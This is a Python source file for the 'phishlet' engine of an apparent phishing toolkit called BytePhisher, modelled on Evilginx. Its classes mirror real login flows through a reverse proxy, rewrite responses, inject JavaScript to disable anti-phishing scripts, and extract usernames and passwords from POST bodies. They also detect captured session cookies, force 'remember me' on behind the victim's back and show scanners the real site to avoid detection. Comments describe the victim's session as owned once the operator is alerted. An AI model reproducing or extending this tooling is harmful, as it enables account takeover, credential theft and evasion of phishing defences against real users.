# BytePhisher - Phishlet v2 engine.
#
# A phishlet describes how to mirror a real authentication flow: which hosts to
# proxy, what to rewrite in the responses, which JavaScript to inject, which
# tokens mark a session as captured, and which POST fields carry credentials.
#
# This is the Evilginx-class model (proxy_hosts / sub_filters / auth_tokens /
# auth_urls / credentials / force_post / js_inject) rebuilt in Python, plus the
# things that model does not have:
#
#   * per-host routing from the victim's own Host header (multi-domain chains,
#     which a single-upstream proxy cannot follow)
#   * MIME-targeted rewrite filters instead of a blanket regex
#   * session-completion detection (all tokens captured OR an auth_url hit)
#   * force_post injection (turning "remember me" on without the victim ticking it)
#   * decoy spoofing: a scanner gets the real site, not a 403
#   * template params + child phishlets (one Okta phishlet, many tenants)
#
# Backwards compatible: the old flat constructor
#   Phishlet(upstream="x.test", capture_cookies=["*"], inject_paths=[".*"])
# still works and is translated into a v2 single-host phishlet.
import json
import os
import re

DEFAULT_MIMES = ("text/html", "application/javascript", "text/javascript",
                 "application/json", "text/css", "application/xml", "text/plain")


def _as_list(v, default=()):
    if v is None:
        return list(default)
    if isinstance(v, str):
        return [v]
    return list(v)


def _safe_search(pattern, text):
    """re.search that treats an invalid pattern as "no match".

    Operator-supplied paths/keys are regexes. A typo like `[unclosed` used to raise
    mid-request (a 500 and a traceback); a bad pattern is a non-match, which is the
    same answer Intercept.matches and AuthToken.matches already give.
    """
    try:
        return re.search(pattern, text) is not None
    except re.error:
        return False


def _subst_params(obj, mapping):
    """Deep-substitute `{param}` placeholders in a phishlet structure.

    The old child() round-tripped through json.dumps -> str.replace -> json.loads, so a
    parameter value containing a quote or a backslash corrupted the JSON and raised
    (a tenant like `a"b` was simply unreachable). Walking the structure substitutes
    without ever touching JSON syntax.
    """
    if isinstance(obj, dict):
        return {k: _subst_params(v, mapping) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_subst_params(v, mapping) for v in obj]
    if isinstance(obj, str):
        out = obj
        for k, v in mapping.items():
            out = out.replace("{" + str(k) + "}", str(v))
        return out
    return obj


class ProxyHost:
    """One upstream host that gets mirrored.

    `phish_sub` is the subdomain WE serve it on, `orig_sub`/`domain` is where it
    really lives. `session=True` marks hosts whose responses carry the cookies
    and credentials worth keeping (static CDNs are `session=False`).
    """

    __slots__ = ("domain", "phish_sub", "orig_sub", "session", "is_landing",
                 "port", "scheme")

    def __init__(self, domain="", phish_sub="", orig_sub="", session=True,
                 is_landing=False, port=443, scheme="https"):
        self.domain = (domain or "").strip().lstrip(".")
        self.phish_sub = (phish_sub or "").strip()
        self.orig_sub = (orig_sub or "").strip()
        self.session = bool(session)
        self.is_landing = bool(is_landing)
        self.port = int(port or (443 if scheme == "https" else 80))
        self.scheme = scheme or "https"

    # ---- addressing ----
    @property
    def orig_host(self):
        return f"{self.orig_sub}.{self.domain}" if self.orig_sub else self.domain

    @property
    def phish_host(self):
        return f"{self.phish_sub}.{self.domain}" if self.phish_sub else self.domain

    @property
    def base_url(self):
        return f"{self.scheme}://{self.orig_host}" + (
            "" if self.port in (80, 443) else f":{self.port}")

    def matches_orig(self, host):
        """Does a Host header / URL host belong to this upstream?"""
        h = (host or "").split(":")[0].lower().strip(".")
        if not h:
            return False
        return h == self.orig_host.lower() or h == self.domain.lower() or \
            h.endswith("." + self.domain.lower())

    def to_dict(self):
        return {"domain": self.domain, "phish_sub": self.phish_sub,
                "orig_sub": self.orig_sub, "session": self.session,
                "is_landing": self.is_landing, "port": self.port,
                "scheme": self.scheme}


class Intercept:
    """One locally answered request.

    `path` is a regex matched against the request path (no query string); an empty
    `method` matches any. `body` is the bytes (or text) the visitor receives, with
    `content_type` and `status`.
    """

    __slots__ = ("path", "method", "body", "content_type", "status", "headers")

    def __init__(self, path="", method="", body=b"", content_type="application/json",
                 status=200, headers=None):
        self.path = str(path or "")
        self.method = str(method or "").upper()
        self.body = body if isinstance(body, (bytes, bytearray)) else str(body or "").encode()
        self.content_type = str(content_type or "application/json")
        self.status = int(status or 200)
        self.headers = dict(headers or {})

    def matches(self, path, method=""):
        if self.method and self.method != str(method or "").upper():
            return False
        if not self.path:
            return False
        try:
            return re.search(self.path, path or "") is not None
        except re.error:
            return False

    def to_dict(self):
        return {"path": self.path, "method": self.method,
                "body": self.body.decode("utf-8", "replace"),
                "content_type": self.content_type, "status": self.status,
                "headers": dict(self.headers)}


class SubFilter:
    """MIME-targeted search/replace applied to proxied response bodies.

    This is how the chain is kept intact: every absolute URL, every JS-built
    origin, every redirect target gets rewritten to our domain - but only in the
    content types you name, so binary assets are never corrupted.
    """

    __slots__ = ("search", "replace", "mimes", "triggers_on", "domain", "orig_sub")

    def __init__(self, search="", replace="", mimes=None, triggers_on="",
                 domain="", orig_sub=""):
        self.search = search
        self.replace = replace
        self.mimes = [m.lower() for m in _as_list(mimes, DEFAULT_MIMES)]
        self.triggers_on = (triggers_on or "").strip().lower()
        self.domain = (domain or "").strip()
        self.orig_sub = (orig_sub or "").strip()

    def applies(self, host, content_type):
        ct = (content_type or "").lower()
        if self.mimes and not any(m in ct for m in self.mimes):
            return False
        if not self.triggers_on:
            return True
        h = (host or "").lower()
        return self.triggers_on in h

    def apply(self, text, ctx):
        """ctx supplies {basedomain}, {orig_domain}, {hostname}, {phish_host}."""
        if not self.search:
            return text
        try:
            repl = self.replace
            for k, v in ctx.items():
                repl = repl.replace("{" + k + "}", str(v))
            return re.sub(self.search, repl, text)
        except re.error:
            return text

    def to_dict(self):
        return {"search": self.search, "replace": self.replace, "mimes": self.mimes,
                "triggers_on": self.triggers_on, "domain": self.domain,
                "orig_sub": self.orig_sub}


class JsInject:
    """JavaScript injected into matching responses (triggered by domain+path).

    Used to hook the page, unhook anti-phishing scripts, clean the address bar,
    or drive a flow (MFA enrollment capture, decoy redirection).
    """

    __slots__ = ("trigger_domains", "trigger_paths", "payload", "js_file", "mimes")

    def __init__(self, payload="", js_file="", trigger_domains=None,
                 trigger_paths=None, mimes=None):
        self.payload = payload or ""
        self.js_file = js_file or ""
        self.trigger_domains = [d.lower() for d in _as_list(trigger_domains)]
        self.trigger_paths = _as_list(trigger_paths, (".*",))
        self.mimes = [m.lower() for m in _as_list(mimes, ("text/html",))]

    def script(self):
        if self.payload:
            return self.payload
        if self.js_file and os.path.isfile(self.js_file):
            with open(self.js_file, encoding="utf-8") as f:
                return f.read()
        return ""

    def applies(self, host, path, content_type):
        ct = (content_type or "").lower()
        if self.mimes and not any(m in ct for m in self.mimes):
            return False
        if self.trigger_domains:
            h = (host or "").lower()
            if not any(d in h for d in self.trigger_domains):
                return False
        p = path or "/"
        return not (self.trigger_paths and not any(_safe_search(rx, p) for rx in self.trigger_paths))

    def to_dict(self):
        # the payload itself must round-trip: emitting only its length made
        # save -> load lose every injected script (found by the round-trip test)
        return {"payload": self.payload, "js_file": self.js_file,
                "trigger_domains": self.trigger_domains,
                "trigger_paths": self.trigger_paths, "mimes": self.mimes}


class AuthToken:
    """A token whose capture marks the session as authenticated.

    Modifiers (same idea as Evilginx): `:regexp` treats the key as a regex,
    `:opt` makes it optional, `:always` also captures session cookies that have
    no expiry set (browsers treat those as session-scoped).
    """

    __slots__ = ("domain", "keys", "source")

    def __init__(self, keys=None, domain="", source="cookie"):
        self.domain = (domain or "").strip().lstrip(".")
        self.keys = [k for k in _as_list(keys) if k]
        self.source = source or "cookie"

    @staticmethod
    def parse_key(spec):
        parts = str(spec).split(":")
        name, mods = parts[0], {p.lower() for p in parts[1:]}
        return name, mods

    def matches(self, name):
        """Return (matched, optional) for a cookie/header name."""
        for spec in self.keys:
            key, mods = self.parse_key(spec)
            if "regexp" in mods:
                try:
                    if re.fullmatch(key, name):
                        return True, "opt" in mods
                except re.error:
                    continue
            elif key.lower() == str(name).lower():
                return True, "opt" in mods
        return False, False

    def wants_domain(self, host):
        """Is this token scoped to `host`?

        An empty host means "we don't know which host produced this" - treat it
        as unscoped instead of failing the check. Failing it silently dropped
        auth tokens that the phishlet scoped to a sibling host, so the session
        never flipped to captured.
        """
        if not self.domain or not host:
            return True
        h = str(host).lower().lstrip(".")
        return h == self.domain or h.endswith("." + self.domain)

    def to_dict(self):
        return {"domain": self.domain, "keys": self.keys, "source": self.source}


class CredentialField:
    """Where a credential lives in a request (post body, json, header)."""

    __slots__ = ("key", "search", "type")

    def __init__(self, key="", search="(.*)", type="post"):
        self.key = key
        self.search = search or "(.*)"
        self.type = (type or "post").lower()

    def extract(self, body_text):
        """Pull the value out of a request body."""
        if self.type == "json":
            try:
                data = json.loads(body_text or "{}")
            except Exception:
                return None
            v = data.get(self.key) if isinstance(data, dict) else None
            if v is None:
                return None
            try:
                m = re.search(self.search, str(v))
                return m.group(1) if m and m.groups() else str(v)
            except re.error:
                return str(v)
        # form-encoded / raw
        try:
            m = re.search(rf"(?:^|&){re.escape(self.key)}=([^&]*)", body_text or "")
            if m:
                from urllib.parse import unquote_plus
                raw = unquote_plus(m.group(1))
                try:
                    mm = re.search(self.search, raw)
                    return mm.group(1) if mm and mm.groups() else raw
                except re.error:
                    return raw
        except re.error:
            pass
        return None

    def to_dict(self):
        return {"key": self.key, "search": self.search, "type": self.type}


class ForcePost:
    """Inject extra fields into a POST on a given path (e.g. remember_me=1)."""

    __slots__ = ("path", "search", "force", "type")

    def __init__(self, path="", search=None, force=None, type="post"):
        self.path = path or ""
        self.search = search or []
        self.force = force or []
        self.type = (type or "post").lower()

    def applies(self, path, body_text):
        if self.path and self.path not in (path or ""):
            return False
        for s in self.search:
            key = s.get("key") if isinstance(s, dict) else None
            if key and not _safe_search(key, body_text or ""):
                return False
        return True

    def apply(self, body_text):
        """Append the forced fields to a form-encoded body."""
        if self.type != "post":
            return body_text
        extra = "&".join(f"{f.get('key')}={f.get('value')}" for f in self.force
                         if isinstance(f, dict) and f.get("key"))
        if not extra:
            return body_text
        body = body_text or ""
        return body + ("&" if body else "") + extra

    def to_dict(self):
        return {"path": self.path, "force": self.force, "type": self.type}


# ================================================================= phishlet ==
class Phishlet:
    """A complete target definition (v2)."""

    def __init__(self, name="phishlet", upstream="", scheme="https",
                 login_path="/", capture_fields=("username", "password"),
                 username_field="username", password_field="password",
                 capture_cookies=("*",), inject_paths=(".*",), block_paths=(),
                 intercepts=(), oauth=None, oauth_callback="/__bh/oauth/cb",
                 redirect_after="", strip_integrity=True, rewrite_hosts=None,
                 verify_tls=True, timeout=20, intel_perms=False,
                 # ---- v2 ----
                 proxy_hosts=None, sub_filters=None, js_inject=None,
                 auth_tokens=None, auth_urls=None, credentials=None,
                 force_post=None, params=None, decoy="real",
                 unauth_url="", hide=False, redirect_victim=True,
                 landing_path="/"):
        self.name = name
        self.scheme = scheme
        self.login_path = login_path
        self.capture_fields = list(capture_fields)
        self.username_field = username_field
        self.password_field = password_field
        self.capture_cookies = list(capture_cookies)
        self.inject_paths = list(inject_paths)
        self.block_paths = list(block_paths)
        self.intercepts = [i if isinstance(i, Intercept) else Intercept(**i)
                           for i in (intercepts or [])]
        self.oauth = oauth if oauth is None or not isinstance(oauth, dict) else oauth
        self.oauth_callback = str(oauth_callback or "/__bh/oauth/cb")
        self.redirect_after = redirect_after
        self.strip_integrity = strip_integrity
        self.verify_tls = verify_tls
        self.timeout = timeout
        self.intel_perms = intel_perms
        self.params = dict(params or {})
        # decoy: what a non-target visitor (scanner, gated, hidden phishlet) sees
        #   "real"  -> the actual upstream site (nothing to report)
        #   "page"  -> a static decoy page
        #   "url"   -> redirect to unauth_url
        self.decoy = decoy
        self.unauth_url = unauth_url
        self.hide = bool(hide)
        self.redirect_victim = bool(redirect_victim)
        self.landing_path = landing_path

        # ---- hosts ----
        if proxy_hosts:
            self.proxy_hosts = [h if isinstance(h, ProxyHost) else ProxyHost(**h)
                                for h in proxy_hosts]
        elif upstream:
            u = upstream.rstrip("/")
            host = u.split("://")[-1]
            scheme_in = u.split("://")[0] if "://" in u else scheme
            port = 443
            if ":" in host:
                host, _, p = host.partition(":")
                port = int(p or 443)
            parts = host.split(".")
            orig_sub = parts[0] if len(parts) > 2 else ""
            domain = ".".join(parts[1:]) if len(parts) > 2 else host
            self.proxy_hosts = [ProxyHost(domain=domain, phish_sub=orig_sub,
                                          orig_sub=orig_sub, session=True,
                                          is_landing=True, port=port,
                                          scheme=scheme_in)]
        else:
            self.proxy_hosts = []

        self.upstream = upstream.rstrip("/") if upstream else (
            self.proxy_hosts[0].orig_host if self.proxy_hosts else "")
        if self.proxy_hosts and not upstream:
            h0 = self.proxy_hosts[0]
            self.upstream = h0.orig_host

        # rewrite_hosts kept for backwards compatibility
        if rewrite_hosts is None:
            self.rewrite_hosts = [h.orig_host for h in self.proxy_hosts]
        else:
            self.rewrite_hosts = list(rewrite_hosts)

        # ---- rewriting / injection ----
        self.sub_filters = [f if isinstance(f, SubFilter) else SubFilter(**f)
                            for f in (sub_filters or [])]
        self.js_inject = [j if isinstance(j, JsInject) else JsInject(**j)
                          for j in (js_inject or [])]

        # ---- session capture ----
        self.auth_tokens = [t if isinstance(t, AuthToken) else AuthToken(**t)
                            for t in (auth_tokens or [])]
        self.auth_urls = list(auth_urls or [])
        self.force_post = [f if isinstance(f, ForcePost) else ForcePost(**f)
                           for f in (force_post or [])]
        if credentials:
            self.credentials = {k: (v if isinstance(v, CredentialField)
                                    else CredentialField(**v))
                                for k, v in credentials.items()}
        else:
            self.credentials = {
                "username": CredentialField(username_field, "(.*)", "post"),
                "password": CredentialField(password_field, "(.*)", "post"),
            }

    # ------------------------------------------------------------ loading ---
    @classmethod
    def from_dict(cls, d):
        d = dict(d or {})
        hosts = d.pop("proxy_hosts", None)
        subs = d.pop("sub_filters", None)
        js = d.pop("js_inject", None)
        toks = d.pop("auth_tokens", None)
        urls = d.pop("auth_urls", None)
        creds = d.pop("credentials", None)
        fp = d.pop("force_post", None)
        intercepts = d.pop("intercepts", None)
        params = d.pop("params", None)
        login = d.pop("login", None) or {}
        login_path = d.pop("login_path", login.get("path", "/"))
        # tolerate the older flat keys
        known = {k: v for k, v in d.items() if k in cls.__init__.__code__.co_varnames}
        ph = cls(login_path=login_path, proxy_hosts=hosts, sub_filters=subs,
                 js_inject=js, auth_tokens=toks, auth_urls=urls, credentials=creds,
                 force_post=fp, params=params, intercepts=intercepts, **known)
        return ph

    @classmethod
    def from_yaml(cls, path):
        import yaml
        with open(path, encoding="utf-8") as f:
            data = yaml.safe_load(f) or {}
        return cls.from_dict(data)

    @classmethod
    def from_json(cls, path):
        with open(path, encoding="utf-8") as f:
            return cls.from_dict(json.load(f))

    @classmethod
    def load(cls, path):
        """Load YAML or JSON by extension."""
        return cls.from_json(path) if str(path).lower().endswith(".json") \
            else cls.from_yaml(path)

    # ---- template params (one phishlet, many tenants) ----
    def child(self, name=None, **values):
        """Create a derived phishlet with {param} placeholders substituted."""
        merged = dict(self.params)
        merged.update(dict(values.items()))
        data = _subst_params(self.to_dict(), merged)
        data["name"] = name or f"{self.name}-{'-'.join(str(v) for v in values.values())}"
        data["params"] = merged
        return Phishlet.from_dict(data)

    # ------------------------------------------------------------ queries ---
    def host_for(self, host_header):
        """Pick the upstream host for a victim request (multi-domain chains)."""
        h = (host_header or "").split(":")[0].lower()
        for ph in self.proxy_hosts:
            if ph.phish_host.lower() == h or ph.matches_orig(h):
                return ph
        # fall back: the landing host (or the first host)
        for ph in self.proxy_hosts:
            if ph.is_landing:
                return ph
        return self.proxy_hosts[0] if self.proxy_hosts else None

    def landing_host(self):
        for ph in self.proxy_hosts:
            if ph.is_landing:
                return ph
        return self.proxy_hosts[0] if self.proxy_hosts else None

    @property
    def base_url(self):
        h = self.landing_host()
        return h.base_url if h else f"https://{self.upstream}"

    def wants_injection(self, path):
        if not self.inject_paths:
            return True
        p = path or "/"
        if any(_safe_search(rx, p) for rx in self.block_paths):
            return False
        return any(_safe_search(rx, p) for rx in self.inject_paths)

    def wants_cookie(self, name):
        if not self.capture_cookies or "*" in self.capture_cookies:
            return True
        return any(str(name).lower() == str(c).lower() for c in self.capture_cookies)

    def js_for(self, host, path, content_type):
        return [j.script() for j in self.js_inject
                if j.applies(host, path, content_type) and j.script()]

    def filters_for(self, host, content_type):
        return [f for f in self.sub_filters if f.applies(host, content_type)]

    def force_post_for(self, path, body_text):
        return [f for f in self.force_post if f.applies(path, body_text)]

    # ---- session completion ----
    def intercept_for(self, path, method=""):
        """The intercept that answers this request, or None.

        Checked before the upstream fetch, so a matching path never leaves the proxy.
        """
        for i in self.intercepts:
            if i.matches(path, method):
                return i
        return None

    def token_wanted(self, name, host=""):
        """(wanted, optional) for a cookie/header name on a host."""
        for t in self.auth_tokens:
            if not t.wants_domain(host):
                continue
            m, opt = t.matches(name)
            if m:
                return True, opt
        return False, False

    def session_complete(self, captured_names, path=""):
        """True when every REQUIRED token is captured, or an auth_url was hit.

        This is the difference between "we saw a login form" and "we own the
        session": the moment it flips, the operator gets the alert and the
        victim can be sent on to the real site.
        """
        if path and self.auth_urls:
            p = path.split("?")[0]
            for u in self.auth_urls:
                try:
                    if re.search(u, p):
                        return True
                except re.error:
                    if u in p:
                        return True
        if not self.auth_tokens:
            return False
        have = {str(n).lower() for n in (captured_names or [])}
        required_left = 0
        for t in self.auth_tokens:
            for spec in t.keys:
                key, mods = AuthToken.parse_key(spec)
                if "opt" in mods:
                    continue
                if "regexp" in mods:
                    try:
                        if not any(re.fullmatch(key, h) for h in have):
                            required_left += 1
                    except re.error:
                        required_left += 1
                elif key.lower() not in have:
                    required_left += 1
        return required_left == 0

    # ------------------------------------------------------------- export ---
    def to_dict(self):
        return {
            "name": self.name, "upstream": self.upstream, "scheme": self.scheme,
            "login_path": self.login_path, "landing_path": self.landing_path,
            "capture_fields": self.capture_fields,
            "capture_cookies": self.capture_cookies,
            "inject_paths": self.inject_paths, "block_paths": self.block_paths,
            "redirect_after": self.redirect_after,
            "strip_integrity": self.strip_integrity,
            "rewrite_hosts": self.rewrite_hosts,
            "verify_tls": self.verify_tls, "timeout": self.timeout,
            "intel_perms": self.intel_perms,
            "proxy_hosts": [h.to_dict() for h in self.proxy_hosts],
            "sub_filters": [f.to_dict() for f in self.sub_filters],
            "js_inject": [j.to_dict() for j in self.js_inject],
            "auth_tokens": [t.to_dict() for t in self.auth_tokens],
            "auth_urls": self.auth_urls,
            "credentials": {k: v.to_dict() for k, v in self.credentials.items()},
            "force_post": [f.to_dict() for f in self.force_post],
            "params": self.params, "decoy": self.decoy,
            "unauth_url": self.unauth_url, "hide": self.hide,
        }

    def to_yaml(self, path=None):
        """Serialise back to YAML (used by the auto-generator and `phishlet save`)."""
        import yaml
        text = yaml.safe_dump(self.to_dict(), sort_keys=False, allow_unicode=True)
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(text)
        return text

    def describe(self):
        return (f"{self.name}: {len(self.proxy_hosts)} host(s), "
                f"{len(self.sub_filters)} filter(s), {len(self.js_inject)} js inject(s), "
                f"{sum(len(t.keys) for t in self.auth_tokens)} auth token(s), "
                f"{len(self.auth_urls)} auth url(s), decoy={self.decoy}")
